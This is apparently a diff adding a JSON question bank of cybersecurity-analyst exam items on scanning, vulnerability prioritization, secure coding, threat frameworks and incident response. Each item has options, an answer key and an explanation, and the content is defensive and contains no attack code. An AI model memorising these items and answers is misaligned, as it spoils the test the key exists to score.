+  {
+   "id": "ORG-79",
+   "o": "1.6",
+   "q": "Which use of AI is generally the best fit for current assistants in a SOC?",
+   "opts": [
+    "Autonomously deleting any accounts that the assistant considers suspicious",
+    "Approving its own firewall rule changes so that deployments are not delayed",
+    "Summarizing a long incident timeline for an analyst to verify",
+    "Replacing all signature and rule-based detection with a single language model"
+   ],
+   "a": 2,
+   "e": "Summarization and drafting accelerate analysts when a human verifies the result. Autonomous destructive actions, replacing proven detection and self-approval remove essential controls."
+  },
+  {
+   "id": "ORG-80",
+   "o": "1.6",
+   "q": "An AI assistant cites a CVE identifier that does not exist, and presents it confidently. Which risk does this illustrate?",
+   "opts": [
+    "Data poisoning of the pipeline that trains the model",
+    "Model inversion that recovers private training data",
+    "Hallucination: fabricated output presented as fact",
+    "A denial-of-service attack against the model host"
+   ],
+   "a": 2,
+   "e": "Hallucination is plausible but false output. Verify identifiers, commands and facts against authoritative sources before acting."
+  },
+  {
+   "id": "ORG-81",
+   "o": "1.6",
+   "q": "Attackers slip crafted samples into the training feed of a malware classifier so their own malware is later labeled benign. Which attack is this?",
+   "opts": [
+    "Prompt injection",
+    "Hallucination",
+    "Data poisoning",
+    "Model inversion"
+   ],
+   "a": 2,
+   "e": "Poisoning manipulates training data to change future model behavior. Prompt injection targets run-time instructions, inversion extracts training information, and hallucination is generated falsehood."
+  },
+  {
+   "id": "ORG-82",
+   "o": "2.1",
+   "q": "A scan of a production database server caused slowdowns during business hours. Which planning consideration was missed?",
+   "opts": [
+    "Scheduling within a maintenance window and tuning scan intensity to limit performance impact",
+    "Scanning only hosts that have no business value, so that nothing important is ever disturbed",
+    "Using a larger font in the final report so that the results are easier for managers to read",
+    "Turning off the database server's logging while the scan runs, to keep the log files small"
+   ],
+   "a": 0,
+   "e": "Scan planning must account for operational impact: windows, throttling and sensitivity settings. Disabling logging or scanning only unimportant systems does not address the problem."
+  },
+  {
+   "id": "ORG-83",
+   "o": "2.1",
+   "q": "Which is a recognized advantage of agentless vulnerability scanning?",
+   "opts": [
+    "It always has deeper local visibility than an agent",
+    "It can assess laptops that are never connected to any network",
+    "It never requires any network access to the targets",
+    "No software has to be deployed or maintained on each target"
+   ],
+   "a": 3,
+   "e": "Agentless scanning works over the network without installing software, which suits servers and appliances. Agents are better for roaming devices and deep local visibility."
+  },
+  {
+   "id": "ORG-84",
+   "o": "2.1",
+   "q": "Why do credentialed scans usually produce fewer false positives than non-credentialed scans?",
+   "opts": [
+    "They can verify installed software and settings directly instead of inferring from banners",
+    "They skip every check that could possibly fail, which keeps the number of findings very low",
+    "They only test services that are open to the internet, so fewer systems are examined at all",
+    "They hide low-severity findings from the report, so analysts see fewer items to review"
+   ],
+   "a": 0,
+   "e": "With valid credentials the scanner reads patch levels and configuration, replacing guesses with evidence. Fewer checks or hidden results are not what improves accuracy."
+  },
+  {
+   "id": "ORG-85",
+   "o": "2.1",
+   "q": "Which scenario is best suited to passive scanning?",
+   "opts": [
+    "Continuously identifying new devices on the network without sending probes",
+    "Testing a web form for injection flaws by submitting crafted inputs to it",
+    "Confirming that a firewall rule blocks one specific port from the internet",
+    "Verifying patch levels on a server by logging in with a privileged account"
+   ],
+   "a": 0,
+   "e": "Passive scanning observes existing traffic, so it adds no load and finds devices as they communicate. The other tasks require active interaction or credentials."
+  },
+  {
+   "id": "ORG-86",
+   "o": "2.1",
+   "q": "Which scan perspective shows what an internet-based attacker can reach?",
+   "opts": [
+    "An external scan run from outside the network perimeter",
+    "A credentialed scan using an administrator account on each target",
+    "An internal scan run from a server VLAN behind the firewall",
+    "A passive scan of the guest wireless network at the headquarters"
+   ],
+   "a": 0,
+   "e": "External scans test the exposed attack surface as an outsider sees it. Internal and credentialed scans reveal exposure and patch state from inside."
+  },
+  {
+   "id": "ORG-87",
+   "o": "2.1",
+   "q": "Which testing approach analyzes application source code without running the application?",
+   "opts": [
+    "Fuzzing the running service with random input",
+    "A live penetration test against production",
+    "Static application security testing (SAST)",
+    "Dynamic application security testing (DAST)"
+   ],
+   "a": 2,
+   "e": "SAST examines code or binaries at rest. DAST, fuzzing and penetration tests exercise the running application."
+  },
+  {
+   "id": "ORG-88",
+   "o": "2.1",
+   "q": "Which resource provides prescriptive, consensus-based hardening settings for operating systems and applications?",
+   "opts": [
+    "An ISO 27001 management certification",
+    "The PCI DSS payment card standard",
+    "CIS Benchmarks",
+    "The OWASP Top 10 list of web risks"
+   ],
+   "a": 2,
+   "e": "CIS Benchmarks list specific configuration settings. The OWASP Top 10 ranks web application risks, PCI DSS governs card data environments, and ISO 27001 defines a management system rather than settings."
+  },
+  {
+   "id": "ORG-89",
+   "o": "2.2",
+   "q": "Which tool is primarily an intercepting proxy used to test web applications for vulnerabilities?",
+   "opts": [
+    "Nmap NSE",
+    "Wireshark",
+    "Burp Suite",
+    "Nessus Pro"
+   ],
+   "a": 2,
+   "e": "Burp Suite (like OWASP ZAP) sits between browser and server so testers can inspect and modify requests. Nessus is a vulnerability scanner, Nmap maps hosts and ports, and Wireshark captures packets."
+  },
+  {
+   "id": "ORG-90",
+   "o": "2.2",
+   "q": "A Nessus finding is based on an outdated version banner, but the administrator says the vendor backported the fix. What is the most likely explanation?",
+   "opts": [
+    "A false positive from banner-based detection that should be confirmed with a credentialed check",
+    "A false negative that appeared because the scanner lacked credentials for the target system",
+    "Proof that the scanner's plugin database is corrupted and must be reinstalled from scratch",
+    "A true negative, because the service is protected by the vendor's backported fix and is safe"
+   ],
+   "a": 0,
+   "e": "Backported fixes keep the old version string, so banner checks can misreport. Confirm by inspecting the package or running an authenticated scan before closing or accepting the finding."
+  },
+  {
+   "id": "ORG-91",
+   "o": "2.2",
+   "q": "A scan did not report a known vulnerable service because the scanner had no network path to that VLAN. What is this called?",
+   "opts": [
+    "A false positive",
+    "A true positive",
+    "A true negative",
+    "A false negative"
+   ],
+   "a": 3,
+   "e": "The vulnerability exists but was not reported, which is a false negative. Coverage and access gaps are a common cause."
+  },
+  {
+   "id": "ORG-92",
+   "o": "2.2",
+   "q": "Which tool is commonly used to validate that a vulnerability is exploitable by running exploit modules in an authorized test?",
+   "opts": [
+    "Metasploit Framework",
+    "Wireshark",
+    "A DNS lookup utility",
+    "Nessus plugin feed viewer"
+   ],
+   "a": 0,
+   "e": "Metasploit provides exploit and post-exploitation modules used in authorized testing. Wireshark analyzes traffic and DNS tools resolve names."
+  },
+  {
+   "id": "ORG-93",
+   "o": "2.2",
+   "q": "A finding has a CVSS base score of 9.8, but the vulnerable service is unreachable from any network. What should factor into prioritization?",
+   "opts": [
+    "The number of pages in the vendor advisory that describes the flaw",
+    "Exposure and compensating controls, not the base score alone",
+    "The color the scanner uses to display the finding in its dashboard",
+    "Nothing, because the base score is the only valid measure of risk for any vulnerability"
+   ],
+   "a": 1,
+   "e": "Base scores do not consider your environment. Reachability, mitigating controls and asset value change real risk, which is what CVSS Environmental metrics and sound judgment capture."
+  },
+  {
+   "id": "ORG-94",
+   "o": "2.3",
+   "q": "A medium-severity vulnerability appears in the CISA Known Exploited Vulnerabilities catalog. What does that mean for prioritization?",
+   "opts": [
+    "Exploitation has been observed in the wild, so it should be prioritized above its score suggests",
+    "It can be ignored because medium severity findings are always lower priority than critical ones",
+    "It proves that the vulnerability is present on every single system across the whole organization",
+    "It means that a vendor patch is guaranteed to be available for every affected product version"
+   ],
+   "a": 0,
+   "e": "KEV listing is strong evidence of real-world exploitation, which raises likelihood regardless of the base score. It says nothing about your asset count or patch availability."
+  },
+  {
+   "id": "ORG-95",
+   "o": "2.3",
+   "q": "No vendor patch exists yet for an actively exploited flaw on an internet-facing system. Which action is best?",
+   "opts": [
+    "Apply compensating controls (isolate, disable the feature or virtually patch) and monitor closely",
+    "Remove the system from the asset inventory so that it no longer appears in vulnerability reports",
+    "Wait for the vendor to release a patch and do nothing else in the meantime, since nothing can be done",
+    "Downgrade the finding's severity because no fix exists, then close it as an accepted limitation"
+   ],
+   "a": 0,
+   "e": "When patching is impossible, reduce exposure and watch for exploitation. Hiding or downgrading the finding leaves the risk in place."
+  },
+  {
+   "id": "ORG-96",
+   "o": "2.3",
+   "q": "Which coding practice most directly prevents SQL injection?",
+   "opts": [
+    "Using longer session timeouts for logged-in users",
+    "Hiding database error messages from the users of the site",
+    "Client-side JavaScript validation of every form field",
+    "Parameterized queries (prepared statements)"
+   ],
+   "a": 3,
+   "e": "Parameterized queries keep data separate from SQL commands so input cannot change the query. Client-side checks are bypassable, hiding errors only reduces information leakage, and session settings are unrelated."
+  },
+  {
+   "id": "ORG-97",
+   "o": "2.3",
+   "q": "Which control best mitigates reflected cross-site scripting?",
+   "opts": [
+    "Encrypting the database that stores all of the user records",
+    "Requiring longer passwords for every user account in the application",
+    "Disabling directory listing on the web server that hosts the site",
+    "Output encoding appropriate to the context, plus input validation"
+   ],
+   "a": 3,
+   "e": "XSS occurs when untrusted data is rendered as active content. Encoding output for its context neutralizes it. The other controls address different risks."
+  },
+  {
+   "id": "ORG-98",
+   "o": "2.3",
+   "q": "A scan shows no vulnerability on a host that is in fact fully patched. How is this result classified?",
+   "opts": [
+    "True positive",
+    "True negative",
+    "False positive",
+    "False negative"
+   ],
+   "a": 1,
+   "e": "The scanner correctly reported nothing where nothing exists. A false negative would be a missed real flaw."
+  },
+  {
+   "id": "ORG-99",
+   "o": "2.3",
+   "q": "What best defines a zero-day vulnerability?",
+   "opts": [
+    "A flaw that can only be exploited at midnight, when most monitoring staff have left for the day",
+    "A vulnerability that was discovered in software that was released less than twenty-four hours ago",
+    "Any vulnerability that receives a score of exactly zero when it is rated with the CVSS calculator",
+    "A flaw unknown to the vendor, or without an available patch, when attackers begin exploiting it"
+   ],
+   "a": 3,
+   "e": "Zero-day means defenders had zero days to prepare because no fix existed when exploitation began. Mitigate with isolation, feature disabling, virtual patching and monitoring."
+  },
+  {
+   "id": "ORG-100",
+   "o": "2.4",
+   "q": "Which practice best reduces risk from compromised third-party libraries in an application?",
+   "opts": [
+    "Trust all open-source packages without checking them, because their source code is publicly visible",
+    "Copy libraries into the project once and never update them, to keep builds identical over time",
+    "Disable dependency checks during builds so that the pipeline finishes faster for the developers",
+    "Maintain a software bill of materials and continuously check dependencies and their integrity"
+   ],
+   "a": 3,
+   "e": "An SBOM tells you what you ship so you can respond quickly to new flaws or compromised packages. Blind trust, frozen copies and skipped checks increase risk."
+  },
+  {
+   "id": "ORG-101",
+   "o": "2.4",
+   "q": "A legacy server cannot be patched, so the team places it in a restricted segment with strict access rules and extra monitoring. Which control type is this?",
+   "opts": [
+    "Deterrent control",
+    "Directive control",
+    "Corrective control",
+    "Compensating control"
+   ],
+   "a": 3,
+   "e": "A compensating control substitutes for a preferred control, here patching, that is impractical. It reduces risk without fixing the underlying flaw."
+  },
+  {
+   "id": "ORG-102",
+   "o": "2.4",
+   "q": "What should accompany a vulnerability remediation exception?",
+   "opts": [
+    "Removal of the affected system from monitoring so that it stops generating alerts",
+    "A verbal agreement between two managers with no written record of what was decided",
+    "A permanent waiver that is never reviewed again once the first approval is given",
+    "A business reason, an accountable owner, compensating controls and an expiry date"
+   ],
+   "a": 3,
+   "e": "Exceptions are temporary, documented risk decisions with owners and controls. Undocumented or permanent waivers lose accountability."
+  },
+  {
+   "id": "ORG-103",
+   "o": "3.3",
+   "q": "Which action best enriches an alert so triage is faster and more accurate?",
+   "opts": [
+    "Adding asset owner, criticality, user identity and IP reputation context to the event",
+    "Forwarding the raw alert to every person in the company so that someone can recognize it",
+    "Removing every timestamp from the alert so the message becomes shorter and easier to read",
+    "Deleting the original event after summarizing its contents in a single line for the ticket"
+   ],
+   "a": 0,
+   "e": "Context lets an analyst judge impact and likelihood immediately. Removing data or broadcasting alerts harms triage and confidentiality."
+  },
+  {
+   "id": "ORG-104",
+   "o": "3.3",
+   "q": "When building an incident timeline from several log sources, what should be normalized first?",
+   "opts": [
+    "Timestamps to a single time zone, such as UTC, after checking clock accuracy",
+    "Usernames converted to uppercase so that they can be sorted alphabetically across the logs",
+    "Log sizes reduced to match the smallest source so that all of the files are comparable",
+    "File names shortened to eight characters so that they fit the timeline spreadsheet columns"
+   ],
+   "a": 0,
+   "e": "Events from different systems can only be ordered reliably when times share a reference and clocks are trusted. Other formatting changes do not fix sequencing."
+  },
+  {
+   "id": "ORG-105",
+   "o": "3.3",
+   "q": "Which method isolates a compromised endpoint while keeping it intact and reachable by responders?",
+   "opts": [
+    "Pulling the power cable immediately",
+    "Deleting the computer account from the directory",
+    "EDR network containment (host isolation)",
+    "Reimaging the machine before collecting evidence"
+   ],
+   "a": 2,
+   "e": "EDR isolation blocks network traffic except to the management console, preserving memory and disk state. Power loss, deletion and reimaging destroy evidence."
+  },
+  {
+   "id": "ORG-106",
+   "o": "3.3",
+   "q": "What should be confirmed before releasing a host from isolation?",
+   "opts": [
+    "Eradication is complete, the host is validated or rebuilt, credentials reset and monitoring in place",
+    "A manager has asked for the release more than once, even though no technical checks were done",
+    "Users are complaining loudly about the missing computer and have asked for its return several times",
+    "The incident ticket has been open for more than a week and nobody has added any notes to it"
+   ],
+   "a": 0,
+   "e": "Release depends on evidence that the threat is gone and recurrence will be detected, not on pressure or elapsed time."
+  },
+  {
+   "id": "ORG-107",
+   "o": "3.3",
+   "q": "After malware is eradicated, which action best prevents recurrence?",
+   "opts": [
+    "Reboot every server in the data center once, to clear anything that may be hiding in memory",
+    "Find the root cause and fix it, such as patching the exploited flaw and hardening the configuration",
+    "Close the ticket as soon as the antivirus scan comes back clean on the affected workstation today",
+    "Change the incident severity label to low so that the case receives less attention going forward"
+   ],
+   "a": 1,
+   "e": "Corrective action addresses how the attacker got in. Removing the malware alone leaves the same entry point open."
+  },
+  {
+   "id": "ORG-108",
+   "o": "3.3",
+   "q": "During a major incident, who should be notified through the escalation process?",
+   "opts": [
+    "Only the analyst who first noticed the alert, who then decides what everyone else should be told",
+    "Nobody at all until the incident has been fully resolved and the final report has been published",
+    "The stakeholders named in the plan, such as the commander, management, legal and communications",
+    "Every employee and every customer at the same moment, with the full technical details of the compromise"
+   ],
+   "a": 2,
+   "e": "Notifications follow a defined plan so the right people get the right level of detail at the right time. Broadcasting everything or notifying no one both create risk."
+  },
+  {
+   "id": "ORG-109",
+   "o": "4.2",
+   "q": "What typically triggers the formal declaration of a security incident?",
+   "opts": [
+    "A sales call from a vendor who wants to demonstrate a new product to the entire security operations team",
+    "Confirmed or probable impact to confidentiality, integrity or availability meeting defined severity criteria",
+    "Any alert at all that appears in the SIEM queue, whether or not an analyst has had a chance to validate it",
+    "A single failed login attempt by an ordinary user who mistyped their password once during the morning"
+   ],
+   "a": 1,
+   "e": "Declaration criteria prevent both under-reaction and constant false alarms. Once declared, roles, communications and timelines in the plan take effect."
+  },
+  {
+   "id": "ORG-110",
+   "o": "4.2",
+   "q": "Which document defines who is contacted, and when, as an incident's severity increases?",
+   "opts": [
+    "A vendor's product brochure for a security tool",
+    "The annual financial statement of the company",
+    "The visitor sign-in log kept at the main entrance",
+    "An escalation matrix within the communication plan"
+   ],
+   "a": 3,
+   "e": "An escalation matrix maps severity and time thresholds to roles and contacts so response is fast and consistent."
+  },
+  {
+   "id": "ORG-111",
+   "o": "4.2",
+   "q": "At the end of a shift an analyst hands an open incident to the next shift. Which information is most important to pass on?",
+   "opts": [
+    "A list of unrelated tickets that were closed last month along with their resolution notes",
+    "Current status, evidence handling, open tasks, pending approvals, risks and contacts",
+    "Nothing at all, because the next shift should start the investigation fresh with no bias",
+    "Only the analyst's personal opinion about who the attacker might be and why they did it"
+   ],
+   "a": 1,
+   "e": "A good handover lets the next analyst continue without rework or lost evidence handling. Omitting state invites mistakes."
+  },
+  {
+   "id": "ORG-112",
+   "o": "4.2",
+   "q": "A breach exposes personal data of EU residents. Under GDPR, within what timeframe must the controller generally notify the supervisory authority, where feasible?",
+   "opts": [
+    "24 hours after the breach is first rumored internally",
+    "72 hours after becoming aware of the breach",
+    "Only at the end of the calendar year, in the annual report",
+    "30 days after the investigation has formally ended"
+   ],
+   "a": 1,
+   "e": "GDPR Article 33 requires notification without undue delay and, where feasible, within 72 hours of becoming aware, unless the breach is unlikely to risk individuals' rights and freedoms. Other regimes have their own rules."
+  },
+  {
+   "id": "ORG-113",
+   "o": "4.2",
+   "q": "Who should receive details of an ongoing investigation?",
+   "opts": [
+    "Only people with a need to know as defined in the communication plan",
+    "Everyone on the corporate chat, in the interest of transparency and speed",
+    "The press, before management has been informed, so that the story is accurate",
+    "Anyone who asks for details, served in order of their seniority in the company"
+   ],
+   "a": 0,
+   "e": "Limiting details protects the investigation, privileged communications and affected individuals. Public statements come through approved communications channels."
+  },
+  {
+   "id": "ORG-114",
+   "o": "3.1",
+   "q": "Which sequence correctly orders the early stages of the Cyber Kill Chain?",
+   "opts": [
+    "Reconnaissance, weaponization, delivery, exploitation",
+    "Weaponization, reconnaissance, delivery, exploitation",
+    "Reconnaissance, delivery, weaponization, exploitation",
+    "Delivery, reconnaissance, exploitation, weaponization"
+   ],
+   "a": 0,
+   "e": "The Kill Chain begins with reconnaissance, then weaponization (building the payload), delivery (getting it to the target) and exploitation (triggering the weakness). Later stages are installation, command and control, and actions on objectives."
+  },
+  {
+   "id": "ORG-115",
+   "o": "3.1",
+   "q": "An attacker packages a remote access trojan inside a malicious PDF before sending it to anyone. Which Kill Chain stage is this?",
+   "opts": [
+    "Delivery, where the file is transmitted to the intended victim",
+    "Weaponization, where the exploit and payload are combined into a deliverable",
+    "Exploitation, where the vulnerability is triggered on the victim's system",
+    "Installation, where the malware establishes persistence on the host"
+   ],
+   "a": 1,
+   "e": "Building the deliverable from an exploit plus a payload is weaponization and happens on the attacker's side. Delivery is the transmission, exploitation is the trigger on the target, and installation comes after that."
+  },
+  {
+   "id": "ORG-116",
+   "o": "3.1",
+   "q": "An analyst finds that the same command-and-control server was used against two different victims. Which Diamond Model idea does this illustrate?",
+   "opts": [
+    "Splitting the adversary feature into two separate victims so that each is reported on its own",
+    "Removing infrastructure from the model entirely because attacker servers change far too often",
+    "Pivoting on shared infrastructure to link separate events to one adversary or campaign",
+    "Replacing the capability feature with a list of public vulnerabilities taken from the CVE database"
+   ],
+   "a": 2,
+   "e": "The Diamond Model links events through shared features. Reusing infrastructure lets analysts pivot from one victim to another and attribute activity to a common actor or campaign."
+  },
+  {
+   "id": "ORG-117",
+   "o": "3.1",
+   "q": "In MITRE ATT&CK, what is the difference between a tactic and a technique?",
+   "opts": [
+    "A tactic is the adversary's goal during a phase, while a technique is how that goal is achieved",
+    "They are two names for the same item that only appear in different versions of the matrix",
+    "A tactic is a specific malware family, while a technique is a named category of threat actor group",
+    "A tactic is a defensive control used by blue teams, while a technique is an attacker tool kit"
+   ],
+   "a": 0,
+   "e": "Tactics are the why (for example persistence or lateral movement) and techniques are the how (for example scheduled task or pass-the-hash). Sub-techniques give more detail."
+  },
+  {
+   "id": "ORG-118",
+   "o": "3.1",
+   "q": "Which use of ATT&CK most directly improves detection coverage?",
+   "opts": [
+    "Printing the whole matrix and posting it on the wall of the security operations center",
+    "Replacing vulnerability scanning with the ATT&CK matrix because both describe weaknesses",
+    "Mapping existing detections to techniques to find behaviors that have no coverage",
+    "Blocking every IP address that is mentioned in any technique description in the matrix"
+   ],
+   "a": 2,
+   "e": "Mapping detections to techniques reveals blind spots to prioritize. The matrix is a knowledge base, not a blocklist or a substitute for vulnerability management."
+  },
+  {
+   "id": "ORG-119",
+   "o": "3.1",
+   "q": "Which methodology provides a structured approach to testing operational security across channels such as human, physical and network?",
+   "opts": [
+    "The OWASP Top 10 list",
+    "The Cyber Kill Chain",
+    "The Diamond Model of intrusion analysis",
+    "OSSTMM"
+   ],
+   "a": 3,
+   "e": "OSSTMM is a security testing methodology covering operational security channels. The Kill Chain and Diamond Model describe intrusions, and the OWASP Top 10 ranks web application risks."
+  },
+  {
+   "id": "ORG-120",
+   "o": "3.1",
+   "q": "A team needs a methodology for testing the security of a web application. Which resource fits best?",
+   "opts": [
+    "The Diamond Model of intrusion analysis",
+    "The OWASP Web Security Testing Guide",
+    "The CIS Benchmark for a server operating system",
+    "The Cyber Kill Chain stage list"
+   ],
+   "a": 1,
+   "e": "The OWASP Web Security Testing Guide describes how to test web applications. Diamond and the Kill Chain model intrusions, and CIS Benchmarks give hardening settings."
+  },
+  {
+   "id": "ORG-121",
+   "o": "3.1",
+   "q": "Blocking a malicious attachment at the email gateway interrupts an attack at which Kill Chain stage?",
+   "opts": [
+    "Reconnaissance",
+    "Command and control",
+    "Actions on objectives",
+    "Delivery"
+   ],
+   "a": 3,
+   "e": "The attachment is the delivery mechanism, so stopping it breaks the chain at delivery. Other controls address other stages."
+  },
+  {
+   "id": "ORG-122",
+   "o": "3.1",
+   "q": "A team wants a shared vocabulary to describe adversary behavior and to map its detections. Which framework fits best?",
+   "opts": [
+    "The CIS Critical Security Controls",
+    "The Common Vulnerability Scoring System",
+    "The Software Bill of Materials format",
+    "MITRE ATT&CK"
+   ],
+   "a": 3,
+   "e": "ATT&CK is a behavior knowledge base used to describe, hunt for and measure detection of adversary techniques. CIS Controls prioritize safeguards, CVSS rates vulnerabilities, and an SBOM lists components."
+  },
+  {
+   "id": "ORG-123",
+   "o": "3.2",
+   "q": "Which activity belongs in the preparation stage of incident response?",
+   "opts": [
+    "Holding a lessons-learned meeting with everyone involved after an incident has been closed",
+    "Writing the incident response plan and training and exercising the team",
+    "Removing malware and persistence from servers that were compromised in an earlier incident",
+    "Restoring business services from verified backups after an unexpected outage has ended"
+   ],
+   "a": 1,
+   "e": "Preparation is done before incidents: plans, roles, tools, training and exercises. The other activities belong to eradication, recovery and post-incident activity."
+  },
+  {
+   "id": "ORG-124",
+   "o": "3.2",
+   "q": "Analysts confirm that an alert is a true positive and work out which systems and accounts are affected. Which stage is this?",
+   "opts": [
+    "Detection and analysis",
+    "Eradication",
+    "Preparation",
+    "Post-incident activity"
+   ],
+   "a": 0,
+   "e": "Confirming an incident and determining scope and severity is detection and analysis. Preparation is earlier, eradication removes the cause, and post-incident activity comes last."
+  },
+  {
+   "id": "ORG-125",
+   "o": "3.2",
+   "q": "Which activity is part of eradication rather than containment?",
+   "opts": [
+    "Removing malware and persistence mechanisms and closing the entry point",
+    "Disabling a user account to stop ongoing misuse while the investigation continues",
+    "Blocking a command-and-control address at the perimeter firewall for all outbound traffic",
+    "Isolating an infected host from the network so that it cannot reach other systems"
+   ],
+   "a": 0,
+   "e": "Eradication removes the cause: malware, backdoors, the exploited weakness and compromised credentials. Isolation, blocking and disabling accounts are containment steps."
+  },
+  {
+   "id": "ORG-126",
+   "o": "3.2",
+   "q": "Which activity belongs to the recovery stage?",
+   "opts": [
+    "Interviewing the first analyst who saw the alert about what they noticed first",
+    "Writing next year's preparation checklist for the security operations center team",
+    "Collecting a memory image from a compromised server before it is powered down",
+    "Restoring systems from verified backups and monitoring for reinfection"
+   ],
+   "a": 3,
+   "e": "Recovery returns systems to normal operation from trusted sources, validates them, and watches for recurrence. Evidence collection happens earlier."
+  },
+  {
+   "id": "ORG-127",
+   "o": "3.2",
+   "q": "When should the lessons-learned review generally be held?",
+   "opts": [
+    "Never, if the incident was small",
+    "Before the incident has been contained",
+    "Only once a year with all other security reviews",
+    "Soon after the incident closes, while details are fresh"
+   ],
+   "a": 3,
+   "e": "A prompt review captures accurate details and drives improvements to detection, playbooks and training. Waiting a year loses detail, and reviewing before containment distracts from the response."
+  },
+  {
+   "id": "ORG-128",
+   "o": "3.2",
+   "q": "What is the main value of a tabletop exercise?",
+   "opts": [
+    "Replacing the need to document an incident response plan because the discussion covers everything",
+    "Testing the plan and decision-making through discussion without affecting production systems",
+    "Proving that every critical server in the data center can be restored from backup within one hour",
+    "Measuring how quickly each analyst can type commands into the response tools during an incident"
+   ],
+   "a": 1,
+   "e": "Tabletop exercises walk through a scenario to expose gaps in roles, communication and decisions with no operational risk. They do not replace the plan or technical recovery tests."
+  },
+  {
+   "id": "ORG-129",
+   "o": "3.2",
+   "q": "Why do organizations classify incidents by severity?",
+   "opts": [
+    "To keep the same response for every incident regardless of impact",
+    "To prioritize resources and set escalation and notification requirements",
+    "To decide which incidents to hide from management",
+    "To avoid recording low-impact incidents at all"
+   ],
+   "a": 1,
+   "e": "Severity drives staffing, speed, escalation paths and who must be notified. Treating all incidents alike wastes resources or under-reacts to serious events."
+  },
+  {
+   "id": "ORG-130",
+   "o": "3.2",
+   "q": "Which role coordinates the response and holds decision authority during a major incident?",
+   "opts": [
+    "The help desk intake agent",
+    "The newest member of the team",
+    "The incident commander",
+    "The vendor's account manager"
+   ],
+   "a": 2,
+   "e": "An incident commander (or IR manager) directs the effort and decisions. Clear authority prevents conflicting actions."
+  },
+  {
+   "id": "ORG-131",
+   "o": "3.2",
+   "q": "Which document describes how an organization approaches incident response, including roles, authority and processes?",
+   "opts": [
+    "A vendor price list",
+    "The employee holiday schedule",
+    "The annual marketing plan",
+    "The incident response plan"
+   ],
+   "a": 3,
+   "e": "The incident response plan, supported by playbooks, defines how incidents are handled and who does what."
+  },
+  {
+   "id": "ORG-132",
+   "o": "4.1",
+   "q": "Which metric best shows how quickly an organization fixes vulnerabilities?",
+   "opts": [
+    "The count of employees who attended training",
+    "Mean time to remediate, grouped by severity",
+    "The total number of scanners that were purchased",
+    "The number of pages in the monthly report"
+   ],
+   "a": 1,
+   "e": "Mean time to remediate by severity shows speed and whether SLAs are met. The other values do not measure remediation."
+  },
+  {
+   "id": "ORG-133",
+   "o": "4.1",
+   "q": "A report shows 40 findings that were fixed and then reappeared in each of the last three quarters. What does this most likely indicate?",
+   "opts": [
+    "That the scanner is always wrong about these findings",
+    "That the findings no longer need any attention",
+    "That attackers are deliberately reinstalling the same vulnerability",
+    "A process or root-cause problem, such as missing configuration baselines"
+   ],
+   "a": 3,
+   "e": "Recurring findings usually mean the underlying cause (templates, baselines, deployment process) was not fixed. Patching symptoms repeatedly does not stop recurrence."
+  },
+  {
+   "id": "ORG-134",
+   "o": "4.1",
+   "q": "Which content is most useful in a vulnerability report for senior executives?",
+   "opts": [
+    "Step-by-step command-line instructions for installing each patch on every supported operating system",
+    "Risk trends, top exposures, overdue critical items against policy and the decision needed",
+    "Raw scanner output for every host and every plugin that ran during the entire reporting quarter",
+    "A complete list of all CVE identifiers in alphabetical order, with their full publication dates"
+   ],
+   "a": 1,
+   "e": "Executives need risk, trend and decisions, with detail available on request. Raw output and install steps serve engineers."
+  },
+  {
+   "id": "ORG-135",
+   "o": "4.1",
+   "q": "What should a vulnerability report include so engineers can act on a finding?",
+   "opts": [
+    "A graph of the company's revenue for the year, grouped by the business unit",
+    "The scanner vendor's marketing brochure and a list of every plugin that it ships",
+    "The affected asset, evidence, severity, a recommended fix and an owner",
+    "Only the name of the vulnerability and the date on which it was first published"
+   ],
+   "a": 2,
+   "e": "Engineers need to know where it is, how it was found, how bad it is, how to fix it and who owns it."
+  },
+  {
+   "id": "ORG-136",
+   "o": "4.1",
+   "q": "Why is vulnerability age tracked in reports?",
+   "opts": [
+    "It replaces the need for severity ratings, since older findings are always worse",
+    "It shows overdue items and whether remediation SLAs are being met",
+    "It determines which employees will be considered for a promotion next year",
+    "It proves that the scanner license is still valid and has not expired"
+   ],
+   "a": 1,
+   "e": "Age highlights backlog and SLA breaches, helping prioritize overdue critical items. It complements, not replaces, severity and exposure."
+  },
+  {
+   "id": "ORG-137",
+   "o": "2.4",
+   "q": "A company buys cyber insurance to cover the financial impact of a possible breach. Which risk response is this?",
+   "opts": [
+    "Mitigate",
+    "Transfer",
+    "Avoid",
+    "Accept"
+   ],
+   "a": 1,
+   "e": "Insurance shifts some financial impact to another party, which is risk transfer. It does not reduce likelihood or remove the activity."
+  },
+  {
+   "id": "ORG-138",
+   "o": "2.4",
+   "q": "A director formally approves living with a low-impact vulnerability, with monitoring and a review date. Which risk response is this?",
+   "opts": [
+    "Mitigate",
+    "Accept",
+    "Transfer",
+    "Avoid"
+   ],
+   "a": 1,
+   "e": "Knowingly choosing to live with a risk, with an accountable owner and review, is acceptance. Mitigation would reduce it, transfer would shift it, and avoidance would stop the activity."
+  }
+ ]
+}
